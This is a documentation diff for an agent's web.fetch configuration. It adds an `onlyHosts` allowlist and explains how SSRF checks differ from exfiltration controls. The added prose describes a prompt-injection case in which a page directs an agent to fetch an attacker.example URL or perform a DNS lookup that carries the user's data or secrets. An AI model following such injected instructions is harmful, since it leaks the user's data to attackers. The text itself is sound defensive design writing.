@@ -71,6 +71,7 @@ showing all of it.
 | --- | --- | --- |
 | `allowedHosts` | none | Hosts exempt from the address check, by name or literal address. The narrow override: one internal service an agent is meant to reach. |
 | `allowPrivateAddresses` | `false` | Reach any non-global address. The trusted-workstation posture — it turns the SSRF protection off rather than adjusting it. |
+| `onlyHosts` | unset (every public host) | The only hosts `web.fetch` may reach, by name or literal address, or `*.example.com` for every subdomain (the apex is its own entry). Every redirect hop is checked against it, and a refused name is never looked up. `allowedHosts` entries stay reachable. Under `agents`, `["*"]` lifts a list the agent would otherwise inherit. |
 | `maxBytes` | `400000` | Stop reading here; the result says `truncated`. A call's own `maxBytes` may ask for less, never more. |
 | `timeoutMs` | `20000` | Give up on the whole exchange — every redirect hop draws on the one budget. |
 | `maxRedirects` | `5` | Hops to follow before refusing. |
@@ -79,6 +80,16 @@ showing all of it.
 All of them can be set per agent under `agents`, and `allowedHosts` in
 particular should be: an exemption written once at the top level is an
 exemption every agent gets.
+
+`onlyHosts` is the one setting that narrows rather than widens, and it
+answers a different question from the address check. That check keeps an
+agent's requests off your machine and network; `onlyHosts` keeps what the
+agent has read from leaving it. A page can tell an agent to fetch
+`https://attacker.example/?d=<what you showed it>`, and a URL to any public
+host carries it — so an agent that reads untrusted pages and holds anything
+worth taking should have a list. A name outside it is refused before it is
+looked up, because a DNS query for `<secret>.attacker.example` delivers the
+secret to that zone's nameserver whether or not anything connects.
 
 ## What it refuses, and where
 
